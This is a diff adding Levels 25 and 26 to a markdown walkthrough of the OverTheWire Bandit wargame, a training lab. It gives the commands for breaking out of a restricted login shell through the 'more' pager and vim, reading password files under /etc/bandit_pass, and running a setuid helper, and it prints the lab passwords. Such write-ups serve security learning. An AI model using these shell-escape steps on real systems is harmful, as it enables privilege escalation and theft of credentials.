@@ -624,3 +624,61 @@ Username: bandit24 <br>
     iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
   </details>
 </details>
+
+## Level 25
+
+Username: bandit25 <br>
+
+- look for the shell used by bandit 26
+- recoginze the the ssh key in `/home/bandit25`
+- login to see banner
+- exploit the way `more` works
+
+<details>
+  <summary>The way</summary>
+  
+  ```shell
+  ssh bandit25@bandit.labs.overthewire.org -p 2220
+  grep bandit26 /home/passwd
+  # shows /usr/bin/showtext
+  vi /usr/bin/showtext # recognize it opens /home/bandit26/text.txt with more and exit
+  # to exploit more resize so the bandit26 ASCII banner shouldn't fit
+  ssh -i /home/bandit25/bandit26.sshkey bandit26@localhost -p 2220 # if the scroll funtion of more wasn't trigered decrease the terminal size
+  # press v for entering vim
+  # In vim for edeting bandit26 password file and get the flag:
+  :e /etc/bandit_pass/bandit26
+  ```
+
+  <details>
+    <summary>Password</summary>
+
+    s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+  </details>
+</details>
+
+## Level 26
+
+Username: bandit26 <br>
+
+- bandit26 will still use showtext as shell so resize the terminal to get `more` started
+- open shell in vim
+- use the tool located in `/home/bandit26` to get the flag
+
+<details>
+  <summary>The way</summary>
+  
+  ```shell
+  ssh bandit26@bandit.labs.overthewire.org -p 2220
+  # press v for entering vim
+  # In vim set end execute shell:
+  :set shell=/bin/bash
+  :shell
+  #now in bash session get thw flag:
+  ./bandit27-do cat /etc/bandit_pass/bandit27
+  ```
+
+  <details>
+    <summary>Password</summary>
+    upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+  </details>
+</details>
